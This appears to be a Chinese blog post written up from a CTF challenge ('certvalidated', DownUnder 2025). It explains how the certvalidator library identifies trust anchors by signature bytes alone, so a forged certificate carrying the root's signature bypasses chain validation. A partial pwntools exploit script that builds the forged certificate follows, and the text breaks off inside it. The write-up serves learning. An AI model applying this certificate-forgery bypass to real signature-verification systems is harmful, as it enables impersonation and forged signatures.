@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"languag3.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.21.1","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":true,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="最近有对证书这方面的需求，正好 DownUnder 2025 正好有这种题目，所以研究了一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025-12-切题">
+<meta property="og:url" content="https://languag3.github.io/2025/12/22/2025-12-%E5%88%87%E9%A2%98/index.html">
+<meta property="og:site_name" content="languag3">
+<meta property="og:description" content="最近有对证书这方面的需求，正好 DownUnder 2025 正好有这种题目，所以研究了一下">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-12-22T12:06:29.000Z">
+<meta property="article:modified_time" content="2025-12-22T12:13:40.269Z">
+<meta property="article:author" content="languag3">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://languag3.github.io/2025/12/22/2025-12-%E5%88%87%E9%A2%98/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://languag3.github.io/2025/12/22/2025-12-%E5%88%87%E9%A2%98/","path":"2025/12/22/2025-12-切题/","title":"2025-12-切题"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2025-12-切题 | languag3</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">languag3</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">众里寻他千百度。蓦然回首，那人却在，灯火阑珊处。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-link"><a href="/links/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>友链</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#certvalidated"><span class="nav-number">1.</span> <span class="nav-text"> certvalidated</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="languag3"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">languag3</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/languag3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;languag3" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1499304232@qq.com" title="E-Mail → mailto:1499304232@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://languag3.github.io/2025/12/22/2025-12-%E5%88%87%E9%A2%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="languag3">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="languag3">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="2025-12-切题 | languag3">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2025-12-切题
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-12-22 20:06:29 / 修改时间：20:13:40" itemprop="dateCreated datePublished" datetime="2025-12-22T20:06:29+08:00">2025-12-22</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>最近有对证书这方面的需求，正好 DownUnder 2025 正好有这种题目，所以研究了一下</p>
+<span id="more"></span> 
+<h2 id="certvalidated"><a class="markdownIt-Anchor" href="#certvalidated"></a> certvalidated</h2>
+<p>题目：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> endesive <span class="keyword">import</span> plain</span><br><span class="line"></span><br><span class="line">TO_SIGN = <span class="string">&#x27;just a random hex string: af17a1f2654d3d40f532e314c7347cfaf24af12be4b43c5fc95f9fb98ce74601&#x27;</span></span><br><span class="line">DUCTF_ROOT_CA = <span class="built_in">open</span>(<span class="string">&#x27;./root.crt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Sign this! &lt;&lt;<span class="subst">&#123;TO_SIGN&#125;</span>&gt;&gt;&#x27;</span>)</span><br><span class="line">content_info = base64.b64decode(<span class="built_in">input</span>(<span class="string">&#x27;Your CMS blob (base64): &#x27;</span>))</span><br><span class="line"></span><br><span class="line">hashok, signatureok, certok = plain.verify(content_info, TO_SIGN.encode(), [DUCTF_ROOT_CA])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;hashok = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;signatureok = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;certok = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">all</span>([hashok, signatureok, certok]):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>其中 <code>endesive</code> 的版本是 2.18.5</p>
+<p>问题非常简洁，核心逻辑如下：</p>
+<ol>
+<li><strong>加载信任根</strong>：读取本地的 <code>root.crt</code> 作为信任锚点（Trust Anchor）。</li>
+<li><strong>生成挑战</strong>：随机生成一个十六进制字符串 <code>TO_SIGN</code>。</li>
+<li><strong>接收输入</strong>：接收用户上传的 Base64 编码的 CMS (Cryptographic Message Syntax) 签名包。</li>
+<li><strong>验证逻辑</strong>：调用 <code>endesive.plain.verify</code> 进行验证，要求满足三个条件：
+<ul>
+<li><code>hashok</code>: 数据哈希匹配（内容未被篡改）。</li>
+<li><code>signatureok</code>: 签名验证通过（数据确实由 CMS 中的证书签名）。</li>
+<li><code>certok</code>: 证书链必须受 <code>root.crt</code> 信任。</li>
+</ul>
+</li>
+</ol>
+<p>如果这三个布尔值都为 <code>True</code>，则输出 <code>flag</code>。</p>
+<p>其中 <code>hashok</code> 和 <code>signatureok</code> 显然不是什么大问题，我们的核心就是如何绕过这个证书链验证实现伪造。</p>
+<p>我们需要对 <code>endesive</code> 进行代码审计，可以发现 <code>plain.verify</code> 调用的是 <code>class VerifyData</code>，审计该函数可以发现验证被分为了两步：</p>
+<ol>
+<li>
+<p><strong>签名验证 (<code>signatureok</code>)</strong>： 直接从 CMS 包中提取证书，取出公钥，验证数据的签名。</p>
+<blockquote>
+<p>这里只验证“证书公钥”和“数据签名”是否匹配，<strong>不验证证书本身的合法性</strong>。这意味着只要我们自己生成密钥对和证书，这一步必然通过。</p>
+</blockquote>
+</li>
+<li>
+<p><strong>信任链验证 (<code>certok</code>)</strong>： 调用 <code>CertificateValidator</code>  来验证证书路径。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">validator = CertificateValidator(</span><br><span class="line">    cert, othercerts, validation_context=<span class="variable language_">self</span>.context</span><br><span class="line">)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    path = validator.validate_usage(<span class="built_in">set</span>([<span class="string">&quot;digital_signature&quot;</span>]))</span><br><span class="line">    certok = <span class="literal">True</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span> * <span class="number">10</span>, <span class="string">&quot;failed certificate verification:&quot;</span>, <span class="built_in">str</span>(ex))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;cert.issuer:&quot;</span>, cert.native[<span class="string">&quot;tbs_certificate&quot;</span>][<span class="string">&quot;issuer&quot;</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;cert.subject:&quot;</span>, cert.native[<span class="string">&quot;tbs_certificate&quot;</span>][<span class="string">&quot;subject&quot;</span>])</span><br><span class="line">    certok = <span class="literal">False</span></span><br><span class="line"><span class="keyword">return</span> (hashok, signatureok, certok)</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>而 <code>CertificateValidator</code> 来自 <code>certvalidator</code> 库，所以我们的核心就是对 <code>certvalidator</code> 进行代码审计。</p>
+<p>查看 <code>class CertificateValidator</code>  发现内部使用 <code>validate_usage</code> 函数进行证书链验证，内部代码很短，就是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">self</span>._validate_path()</span><br><span class="line">validate_usage(</span><br><span class="line">    <span class="variable language_">self</span>._context,</span><br><span class="line">    <span class="variable language_">self</span>._certificate,</span><br><span class="line">    key_usage,</span><br><span class="line">    extended_key_usage,</span><br><span class="line">    extended_optional</span><br><span class="line">)</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">self</span>._path</span><br></pre></td></tr></table></figure>
+<p>因此接下来我们要分析 <code>_validate_pat</code></p>
+<p>在 <code>_validate_path</code> 中，核心逻辑是<strong>构建证书路径</strong>。如果没有合法的路径从待验证证书通向受信任的根证书，验证就会失败。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 尝试构建路径</span></span><br><span class="line">    paths = <span class="variable language_">self</span>._context.certificate_registry.build_paths(<span class="variable language_">self</span>._certificate)</span><br><span class="line"><span class="keyword">except</span> (PathBuildingError) <span class="keyword">as</span> e:</span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure>
+<p>如果 <code>build_paths</code> 成功返回了路径，接下来才会调用 <code>validate_path</code> 进行校验。因此，**构建路径（Path Building）**是我们的下一个审计重点。</p>
+<p>查看  <code>build_paths</code>，打开 <code>certvalidator/registry.py</code>。<code>build_paths</code> 初始化一个路径对象，然后调用 <code>_walk_issuers</code>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">build_paths</span>(<span class="params">self, end_entity_cert</span>):</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    path = ValidationPath(end_entity_cert)</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="variable language_">self</span>._walk_issuers(path, paths, failed_paths)</span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure>
+<p>核心是 <code>_walk_issuers</code>，这个函数负责向上查找父证书，直到找到信任锚（Trust Anchor）。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_walk_issuers</span>(<span class="params">self, path, paths, failed_paths</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    ... stopping once the certificate in question is one contained within the CA certs list</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 核心漏洞</span></span><br><span class="line">    <span class="keyword">if</span> path.first.signature <span class="keyword">in</span> <span class="variable language_">self</span>._ca_lookup:</span><br><span class="line">        paths.append(path)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure>
+<p>注意这行代码：<code>if path.first.signature in self._ca_lookup:</code>。 它在判断当前证书是否为受信任的根证书时，<strong>仅仅检查了证书的签名（signature bytes）是否存在于 <code>_ca_lookup</code> 表中</strong>。</p>
+<p>这是一个非常危险的信号。正常情况下，判断一个证书是否是某个特定的 Root CA，应该比对它的 Subject 字段、公钥指纹（Fingerprint）或者完整的证书哈希。<strong>签名（Signature）只是证书的一部分数据</strong>，它本身并不代表身份。</p>
+<p>为了确认这个猜想，我们需要看 <code>CertificateRegistry.__init__</code> 是如何填充 <code>_ca_lookup</code> 的。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">self</span>._ca_lookup = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> trust_root <span class="keyword">in</span> trust_roots:</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="variable language_">self</span>._ca_lookup[trust_root.signature] = <span class="literal">True</span></span><br></pre></td></tr></table></figure>
+<p>可以发现，信任库确实是用“签名数据”作为 Key 来索引受信任证书的。</p>
+<p>这时候如果我们构造一个证书 <code>FakeCert</code>：</p>
+<ul>
+<li>它的内容（公钥、有效期等）是我自己填的。</li>
+<li>但是我把它的 <strong>Signature Value</strong> 字段强行替换成 <code>RootCert</code> 的签名。</li>
+</ul>
+<p>我们进行验签的话，当代码运行到 <code>_walk_issuers</code> 时，它读取 <code>FakeCert.signature</code>。</p>
+<p>由于 <code>FakeCert.signature == RootCert.signature </code>，所以其会认为 <code>FakeCert.signature</code>  在 <code>_ca_lookup</code> 中，从而判定 <code>FakeCert</code> 就是受信任的 <code>RootCert</code>。</p>
+<p>当然还有最后一步，就是检查 <code>validate.py</code>，因为路径构建成功后，通常验证器还会对路径上的每个证书进行密码学验签。我们需要确认这种欺骗是否能通过后续的检查。</p>
+<p>查看 <code>validate_path</code> 和 <code>_validate_path</code>，回到 <code>certvalidator/validate.py</code>。<code>_validate_path</code> 函数接收我们刚刚构建的“非法路径”。 假设我们的路径只包含一个证书：<code>[FakeCert]</code>（因为它被误认为是根证书，所以它是路径的起点也是终点）。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_validate_path</span>(<span class="params">validation_context, path, ...</span>):</span><br><span class="line">    trust_anchor = path.first <span class="comment"># FakeCert</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># path_length = 1 - 1 = 0</span></span><br><span class="line">    path_length = <span class="built_in">len</span>(path) - <span class="number">1</span> </span><br><span class="line"></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 验证循环</span></span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line">    last_index = <span class="built_in">len</span>(path) - <span class="number">1</span> <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># while 1 &lt;= 0, pass</span></span><br><span class="line">    <span class="keyword">while</span> index &lt;= last_index:</span><br><span class="line">        cert = path[index]</span><br><span class="line">        <span class="comment"># 只有进入这里才会执行 verify_func</span></span><br><span class="line">        <span class="comment"># ...</span></span><br></pre></td></tr></table></figure>
+<p>因此：</p>
+<ul>
+<li>X.509 验证逻辑中，<strong>信任锚（Trust Anchor）</strong> 本身是不需要验证签名的（因为它是信任的起点，通常是自签名的）。</li>
+<li>由于 <code>registry.py</code> 的 bug，我们的 <code>FakeCert</code> 被当成了信任锚。</li>
+<li>因此，<code>validate.py</code> 里的验签逻辑<strong>完全跳过了</strong>对 <code>FakeCert</code> 自身的验证。</li>
+<li>最终函数返回成功，<code>verifier.py</code> 里的 <code>certok</code> 变为 <code>True</code>。</li>
+</ul>
+<p>最后我们来总结一下漏洞：</p>
+<ul>
+<li>验证器通过比对 <strong>Signature Value (签名字节流)</strong> 来识别根证书，而不是比对证书指纹或公钥。如果攻击者伪造一个证书，将其签名部分替换为 <code>root.crt</code> 的签名，验证器就会误以为这个伪造证书就是系统里的根证书。</li>
+<li>一旦验证器认为它是根证书（Trust Anchor），在随后的 <code>validate.py</code> 逻辑中，作为路径起点的根证书是<strong>不会验证其自身的签名的</strong>（因为根证书通常是自签名的且被系统隐式信任）。</li>
+</ul>
+<p>最后就是构造攻击了，根据题目我们要构造满足以下所有条件的 CMS 包：</p>
+<ol>
+<li><strong>满足 <code>signatureok</code></strong>：
+<ul>
+<li>使用我们自己生成的 RSA 私钥对 <code>TO_SIGN</code> 进行签名。</li>
+<li>CMS 中包含的证书必须携带对应的公钥。</li>
+</ul>
+</li>
+<li><strong>满足 <code>certok</code> (欺骗 <code>registry.py</code>)</strong>：
+<ul>
+<li>伪造证书的 <code>Subject</code> 和 <code>Issuer</code> 必须与 <code>root.crt</code> 一致。</li>
+<li><strong>攻击核心</strong>：将伪造证书序列化后，找到其签名部分，强制替换为 <code>root.crt</code> 的原始签名字节。</li>
+</ul>
+</li>
+<li><strong>满足 <code>validate_usage</code></strong>：
+<ul>
+<li><code>verifier.py</code> 显式检查了 <code>validate_usage(set([&quot;digital_signature&quot;]))</code>。</li>
+<li>伪造证书必须包含 <code>KeyUsage</code> 扩展，并开启 <code>digital_signature</code> 位，否则验证会抛出异常导致 <code>certok=False</code>。</li>
+</ul>
+</li>
+</ol>
+<p>然后就是构造这种证书了，伪造逻辑都有了，所以你只要把攻击方式告诉 ai 就好了，ai 就可以自动生成你需要的伪造代码了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> cryptography <span class="keyword">import</span> x509</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> hashes, serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa, padding</span><br><span class="line"><span class="keyword">from</span> asn1crypto <span class="keyword">import</span> cms, x509 <span class="keyword">as</span> ax509</span><br><span class="line"></span><br><span class="line">conn = process([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;certvalidated.py&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_exploit_cert</span>(<span class="params">subject, issuer, pub_key, priv_key</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    生成包含必要扩展的伪造证书</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    builder = x509.CertificateBuilder()</span><br><span class="line">    builder = builder.subject_name(subject)</span><br><span class="line">    builder = builder.issuer_name(issuer)</span><br><span class="line">    builder = builder.not_valid_before(datetime.datetime.utcnow() - datetime.timedelta(days=<span class="number">1</span>))</span><br><span class="line">    builder = builder.not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=<span class="number">365</span>))</span><br><span class="line">    builder = builder.serial_number(x509.random_serial_number())</span><br><span class="line">    builder = builder.public_key(pub_key)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># verifier.py 显式检查了 digital_signature 权限</span></span><br><span class="line">    builder = builder.add_extension(</span><br><span class="line">        x509.KeyUsage(</span><br><span class="line">            digital_signature=<span class="literal">True</span>,</span><br><span class="line">            content_commitment=<span class="literal">False</span>,</span><br><span class="line">            key_encipherment=<span class="literal">False</span>,</span><br><span class="line">            data_encipherment=<span class="literal">False</span>,</span><br><span class="line">            key_agreement=<span class="literal">False</span>,</span><br><span class="line">            key_cert_sign=<span class="literal">True</span>, <span class="comment"># 同时也伪装成 CA</span></span><br><span class="line">            crl_sign=<span class="literal">True</span>,</span><br><span class="line">            encipher_only=<span class="literal">False</span>,</span><br><span class="line">            decipher_only=<span class="literal">False</span></span><br><span class="line">        ),</span><br><span class="line">        critical=<span 